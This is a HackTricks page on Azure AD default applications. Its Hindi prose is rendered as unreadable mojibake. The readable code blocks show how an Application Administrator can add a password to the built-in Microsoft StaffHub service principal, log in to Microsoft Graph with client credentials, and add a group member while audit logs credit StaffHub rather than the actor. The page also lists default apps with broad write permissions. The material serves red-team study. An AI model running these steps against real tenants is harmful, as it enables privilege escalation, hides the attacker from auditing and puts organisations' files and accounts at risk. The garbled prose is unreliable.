# Az - рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ.

</details>

**рдпрд╣ рддрдХрдиреАрдХ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢ рд╣реИ рдЬреЛ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ** [**https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/**](https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/) рдореЗрдВ, [**https://www.youtube.com/watch?v=JEIR5oGCwdg**](https://www.youtube.com/watch?v=JEIR5oGCwdg) рдФрд░ [**https://www.youtube.com/watch?v=xei8lAPitX8**](https://www.youtube.com/watch?v=xei8lAPitX8)

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

Azure рдореЗрдВ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рд╕рд░реНрд╡рд┐рд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗ рдмреАрдЪ рдХрд╛ рдЕрдВрддрд░:

* **рдПрдкреНрд▓рд┐рдХреЗрд╢рди/рдПрдкреНрдк рд░рдЬрд┐рд╕реНрдЯреНрд░реЗрд╢рдиреНрд╕**: рдпреЗ рд╡реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЗ Azure AD рдореЗрдВ рдореМрдЬреВрдж рд╣реИрдВ
* `(Get-AzureADApplication -filter "DisplayName eq 'testapp'")`
* **рд╕рд░реНрд╡рд┐рд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓/рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕**: рдЖрдкрдХреЗ Azure AD рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ Azure Directory рдореЗрдВ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпреЗ рдпрд╛ рддреЛ рдЖрдкрдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реЗ рдЬреБрдбрд╝реЗ рд╣реЛрддреЗ рд╣реИрдВ
* `Get-AzureADServicePrincipal -filter "DisplayName eq 'testapp'")`
* рдпрджрд┐ рджрд┐рдП рдЧрдП рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдмрд╣реБрдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИрдВ рддреЛ рдПрдХ рдПрдбрдорд┐рди рдХреЛ рдЗрдиреНрд╣реЗрдВ рдордВрдЬреВрд░реА рджреЗрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **рдерд░реНрдб рдкрд╛рд░реНрдЯреА рдЯреЗрдиреЗрдВрдЯ** рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдкрд╣реБрдВрдЪ рджреЗрддреЗ рд╣реИрдВ рддреЛ рдПрдХ **рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рдПрдкреНрд▓рд┐рдХреЗрд╢рди/рд╕рд░реНрд╡рд┐рд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдЖрдкрдХреЗ рдЯреЗрдиреЗрдВрдЯ рдореЗрдВ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рддрд╛рдХрд┐ рдЗрд╕реЗ рдЬрд░реВрд░реА рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓ рд╕рдХреЗ:

<figure><img src="../../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдореЗрдВ рджреЛ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рднреА рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд░реНрд╡рд┐рд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рд╕реМрдВрдкреЗ рдЬрд╛рддреЗ рд╣реИрдВ:

* **рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдЕрдиреБрдорддрд┐рдпрд╛рдВ**: рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рдЗрди-рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдореМрдЬреВрдж рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП
* **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдиреБрдорддрд┐рдпрд╛рдВ**: рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╕реМрдВрдкреА рдЬрд╛рддреА рд╣реИрдВ рдФрд░ рдХрд┐рд╕реА рднреА рд╕рдордп рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **Azure рдкреЛрд░реНрдЯрд▓** рд╕рд░реНрд╡рд┐рд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдХреЛ **"рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕"** рдХрд╣рддрд╛ рд╣реИ рдФрд░ рдЕрдзрд┐рдХрд╛рдВрд╢ **рдЧреБрдгреЛрдВ** рдХреЛ рд╕рд░реНрд╡рд┐рд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдХреЗ рджреГрд╢реНрдп рд╕реЗ **рдЫрд┐рдкрд╛рддрд╛** рд╣реИред

Office 365 рдФрд░ рдЕрдиреНрдп **Microsoft рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕** рдХреЗ рд▓рд┐рдП, **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** **рдкрд░рд┐рднрд╛рд╖рд╛** Microsoft рдХреЗ **рд╕рдорд░реНрдкрд┐рдд Azure рдбрд╛рдпрд░реЗрдХреНрдЯрд░реАрдЬ** рдореЗрдВ рд╕реЗ рдПрдХ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред

{% hint style="danger" %}
Office 365 рдЯреЗрдиреЗрдВрдЯ рдореЗрдВ, рдЗрди рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд┐рд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдПрдХ **Office 365 Azure AD рдореЗрдВ рд▓рдЧрднрдЧ 200 рд╕рд░реНрд╡рд┐рд╕ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓реНрд╕ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдмрдирддреЗ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рд╕рднреА рдХреЗ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкреВрд░реНрд╡-рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдВ рд╣реЛрддреА рд╣реИрдВ**ред
{% endhint %}

## Microsoft рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛

рдПрдХ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░** (рдпрд╛ **рдСрди-рдкреНрд░рд┐рдорд╛рдЗрд╕ рд╕рд┐рдВрдХ рдЕрдХрд╛рдЙрдВрдЯ** рдпрджрд┐ рдЖрдк рдСрди-рдкреНрд░рд┐рдорд╛рдЗрд╕ рд╕реЗ рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд░рд╣реЗ рд╣реИрдВ) рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕реМрдВрдк рд╕рдХрддрд╛ рд╣реИ**, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рдпрд╣ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **рдХреНрд▓рд╛рдЗрдВрдЯ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЧреНрд░рд╛рдВрдЯ** OAuth2 рдлреНрд▓реЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕реМрдВрдкрдирд╛ PowerShell рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрднрд╡ рд╣реИ:
```powershell
PS C:\> $sp = Get-AzureADServicePrincipal -searchstring "Microsoft StaffHub"
PS C:\> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "31-12-2099 12:00:00" -StartDate "6-8-2018 13:37:00" -Value redactedpassword


CustomKeyIdentifier :
EndDate             : 31-12-2099 12:00:00
KeyId               :
StartDate           : 6-8-2018 13:37:00
Value               : redactedpassword
```
рдлрд┐рд░, рдЖрдк рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЬрд╛рд░реА рдХрд┐рдП рдЧрдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ **JWT рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ Microsoft Graph рдореЗрдВ рдХреНрдпрд╛ рднреВрдорд┐рдХрд╛рдПрдБ рд╣реИрдВ**:
```python
import requests
import json
import jwt
import pprint

# This should include the tenant name/id
AUTHORITY_URL = 'https://login.microsoftonline.com/ericsengines.onmicrosoft.com'
TOKEN_ENDPOINT = '/oauth2/token'

data = {'client_id':'aa580612-c342-4ace-9055-8edee43ccb89',
'resource':'https://graph.microsoft.com',
'client_secret':'redactedpassword',
'grant_type':'client_credentials'}

r = requests.post(AUTHORITY_URL + TOKEN_ENDPOINT, data=data)

data2 = r.json()

try:
jwtdata = jwt.decode(data2['access_token'], verify=False)
pprint.pprint(jwtdata)
except KeyError:
pass
```
рдпрд╣ рдЯреЛрдХрди рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛, рдЬрд┐рд╕рдореЗрдВ "Roles" рдлреАрд▓реНрдб рд╢рд╛рдорд┐рд▓ рд╣реИ:

<pre class="language-json"><code class="lang-json">{
"aio": "42FgYJg946pl8aLnJXPOnn4zTe/mBwA=",
"app_displayname": "Microsoft StaffHub",
"appid": "aa580612-c342-4ace-9055-8edee43ccb89",
"appidacr": "1",
"aud": "https://graph.microsoft.com",
"exp": 1567200473,
"iat": 1567171373,
"idp": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
"iss": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
"nbf": 1567171373,
"oid": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
<strong> "roles": ["Directory.ReadWrite.All",
</strong><strong>           "Mail.Read",
</strong><strong>           "Group.Read.All",
</strong><strong>           "Files.Read.All",
</strong><strong>           "Group.ReadWrite.All"],
</strong> "sub": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
"tid": "50ad18e1-bb23-4466-9154-bc92e7fe3fbb",
"uti": "2GScBJopwk2e3EFce7pgAA",
"ver": "1.0",
"xms_tcdt": 1559139940
}
</code></pre>

рдпрд╣ рд╡рд┐рдзрд┐ рдХреЗрд╡рд▓ **Microsoft Graph** рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░рддреА рдкреНрд░рддреАрдд рд╣реЛрддреА рд╣реИ (Azure AD рдЧреНрд░рд╛рдл рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ)ред рдореБрдЭреЗ рдпрдХреАрди рдирд╣реАрдВ рд╣реИ рдХрд┐ рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рдРрдкреНрд╕ рдХреЗ рдкрд╛рд╕ Azure AD рдЧреНрд░рд╛рдл рдкрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рдирд╣реАрдВ рд╣реИрдВ рдпрд╛ рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреБрдХреНрдд рдкреНрд░рдгрд╛рд▓реА рдЕрд▓рдЧ рд╣реИред

рдпрджрд┐ рд╣рдо Office 365 рдЯреЗрдиреЗрдВрдЯ рдореЗрдВ рд╕рднреА рд▓рдЧрднрдЧ 200 рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдРрдкреНрд╕ рдХреЗ рд▓рд┐рдП рдпрд╣ рдХреНрд░рд┐рдпрд╛ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдореЗрдВ рдЙрди **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдПрдХ рдЕрд╡рд▓реЛрдХрди рдорд┐рд▓рддрд╛ рд╣реИ рдЬреЛ рдЗрди рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЗ рдкрд╛рд╕ рд╣реИрдВ**ред рдиреАрдЪреЗ рдореИрдВрдиреЗ рдкрд╣рдЪрд╛рдиреА рдЧрдИ рд╕рдмрд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдПрдХ рдЕрд╡рд▓реЛрдХрди рд╣реИред

| рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХрд╛ рдирд╛рдо                      | AppId                                | рдкрд╣реБрдБрдЪ                              |
| ------------------------------------- | ------------------------------------ | ----------------------------------- |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Sites.ReadWrite.All**             |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.FullControl.All**           |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Group.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **User.ReadWrite.All**              |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **IdentityRiskyUser.ReadWrite.All** |
| Microsoft Teams                       | 1fec8e78-bce4-4aaf-ab1b-5451cc387264 | **Sites.ReadWrite.All**             |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Directory.ReadWrite.All**         |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Group.ReadWrite.All**             |
| Microsoft.Azure.SyncFabric            | 00000014-0000-0000-c000-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Sites.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Group.ReadWrite.All**             |
| Office 365 Exchange Online            | 00000002-0000-0ff1-ce00-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **User.ReadWrite.All**              |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **AuditLog.Read.All**               |
| Azure AD Identity Governance Insights | 58c746b0-a0b0-4647-a8f6-12dde5981638 | **AuditLog.Read.All**               |
| Kaizala Sync Service                  | d82073ec-4d7c-4851-9c5d-5d97a911d71d | **Group.ReadWrite.All**             |

## рд╣рдорд▓реЗ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢

рддреЛ TL;DR рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдк **Application Administrator** рдЦрд╛рддреЗ рдпрд╛ **on-premise Sync Account** рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕, рд╕рдореВрд╣ рд╕рджрд╕реНрдпрддрд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ, SharePoint рд╕рд╛рдЗрдЯреНрд╕ рдФрд░ OneDrive рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝ рдФрд░ **рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдпрд╣ **рдореМрдЬреВрджрд╛ рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдХреЗ** рдФрд░ рдлрд┐рд░ рдЗрди рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдк рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЛ рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛** [**рдкреНрд░рдорд╛рдгрдкрддреНрд░**](https://docs.microsoft.com/en-us/powershell/azure/active-directory/signing-in-service-principal?view=azureadps-2.0) **рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдХреЗ** рдФрд░ рдлрд┐рд░ рдЙрд╕ рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдХреЗред рдореИрдВ рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Python рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реВрдБ рдХреНрдпреЛрдВрдХрд┐ PowerShell рдореЙрдбреНрдпреВрд▓ рдЗрд╕рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ (рдпрд╣ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рд╡рд╣ рд╕реЗрдЯ рдЕрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИ)ред

рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ рдХрдорд╛рдВрдб рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдЬрдм рдРрд╕реЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рд▓реЙрдЧ рдЗрди рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╕рдореВрд╣ рд╕рджрд╕реНрдпрддрд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рд╢рдХреНрддрд┐ рд╣реЛрддреА рд╣реИ (рдХреБрдЫ рдРрд╕рд╛ рдЬреЛ рдЖрдорддреМрд░ рдкрд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдкреНрд░рд╢рд╛рд╕рдХ рдХреЗ рдкрд╛рд╕ рдирд╣реАрдВ рд╣реЛрддрд╛):
```powershell
PS C:\> add-azureadgroupmember -RefObjectId 2730f622-db95-4b40-9be7-6d72b6c1dad4 -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8
PS C:\> Get-AzureADGroupMember -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8

ObjectId                             DisplayName UserPrincipalName                 UserType
--------                             ----------- -----------------                 --------
2730f622-db95-4b40-9be7-6d72b6c1dad4 Mark        mark@bobswrenches.onmicrosoft.com Member
```
Azure AD рдСрдбрд┐рдЯ рд▓реЙрдЧ рдореЗрдВ, рдХреНрд░рд┐рдпрд╛рдПрдБ "Microsoft StaffHub" рджреНрд╡рд╛рд░рд╛ рдХреА рдЧрдИ рд╣реЛрдиреЗ рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИрдВ, рдФрд░ рдЗрд╕рд▓рд┐рдП рд▓реЙрдЧ рдореЗрдВ рдХреБрдЫ рднреА рдпрд╣ рд╕рдВрдХреЗрдд рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпреЗ рдХреНрд░рд┐рдпрд╛рдПрдБ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рджреНрд╡рд╛рд░рд╛ рдХреА рдЧрдИ рдереАрдВред

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
